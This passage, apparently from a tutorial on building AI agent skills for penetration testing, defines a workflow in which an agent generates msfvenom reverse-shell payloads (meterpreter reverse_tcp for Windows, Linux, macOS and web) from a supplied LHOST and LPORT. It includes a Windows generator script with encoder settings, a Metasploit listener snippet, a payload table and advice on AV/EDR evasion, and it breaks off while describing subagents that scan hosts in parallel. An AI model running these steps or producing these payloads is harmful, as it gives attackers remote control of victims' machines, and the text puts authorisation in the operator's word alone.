  Note that shikata_ga_nai is x86-only. Use `-e x64/xor` or move to a
  proper loader outside msfvenom.

If the target has any modern EDR:
  msfvenom encoders will not evade it. State this clearly to the operator
  and suggest a custom loader instead.

## Steps

1. Ask for: target OS, arch, delivery format, LHOST, LPORT, payload type
   (reverse_tcp/https/bind), and any evasion constraints.
2. Read `references/payload-matrix.md` to confirm payload name for the
   platform combination.
3. Pick encoder from `references/encoders.md`.
4. Run the appropriate script:
   - `scripts/gen-windows.sh <lhost> <lport> <payload> <outfile>`
   - `scripts/gen-linux.sh <lhost> <lport> <payload> <outfile>`
   - `scripts/gen-web.sh <lhost> <lport> <lang> <outfile>`
5. Show the generated file's size and a hash. Warn the operator to test
   the payload in an isolated VM against the same AV/EDR the target runs.
6. Print the matching Metasploit handler snippet:

use exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false run -j

## Reference files
- `references/payload-matrix.md` — OS/arch/format → payload-name table.
- `references/encoders.md` — encoder capabilities and constraints.

## Common pitfalls
- Payload/handler mismatch — the handler must use the identical payload
name. Print both.
- Shikata_ga_nai as an EDR bypass — it is not. Modern EDR flags encoded
msfvenom output on sight.
- Forgetting `-b` to specify bad characters when generating exploit
shellcode — the payload will contain nulls the exploit chain rejects.
11.3 Windows generator script

scripts/gen-windows.sh:
#!/usr/bin/env bash
set -euo pipefail

LHOST="${1:?}"
LPORT="${2:?}"
PAYLOAD="${3:?}"
OUTFILE="${4:?}"

msfvenom \
  -p "${PAYLOAD}" \
  LHOST="${LHOST}" \
  LPORT="${LPORT}" \
  -f exe \
  -e x86/shikata_ga_nai -i 6 \
  -o "${OUTFILE}"

sha256sum "${OUTFILE}"
ls -lh "${OUTFILE}"
11.4 Payload matrix reference

references/payload-matrix.md:
# Payload matrix

| Target OS | Arch | Format | Recommended payload |
|-----------|------|--------|--------------------|
| Windows | x64 | exe | windows/x64/meterpreter/reverse_tcp |
| Windows | x64 | exe (stageless) | windows/x64/meterpreter_reverse_tcp |
| Windows | x86 | exe | windows/meterpreter/reverse_tcp |
| Windows | x64 | dll | windows/x64/meterpreter/reverse_tcp (fmt=dll) |
| Linux | x64 | elf | linux/x64/meterpreter/reverse_tcp |
| Linux | x86 | elf | linux/x86/meterpreter/reverse_tcp |
| macOS | x64 | macho | osx/x64/meterpreter/reverse_tcp |
| Web | php | php | php/meterpreter/reverse_tcp |
| Web | aspx | aspx | windows/x64/meterpreter/reverse_tcp (fmt=aspx) |
| Web | jsp | war/jsp | java/jsp_shell_reverse_tcp |

That is payload-generate complete — a decision-driven wrapper that produces the right payload with the right encoder and the matching handler snippet.
12. Multi-Step Skills That Call Subagents

Some pentest workflows have parts that can run in parallel — say, running nikto and gobuster against several hosts at once. Skills can spawn subagents via the Task tool for those parts.
12.1 When parallelism helps

    Independent per-host work (nikto against 20 hosts at once).
    Independent per-endpoint work (gobuster against multiple base URLs).
    Independent tool sweeps that do not share state.

Do not parallelize:

    Steps that must run in order (recon → live probe → vuln scan).
    Steps that share output files (concurrent writes corrupt them).

12.2 Skill body that spawns subagents
## Steps

1. Read the live-hosts file (`live.txt`) produced by the previous step.
2. Split hosts into groups of five.
3. For each group, spawn a subagent via the Task tool with prompt:
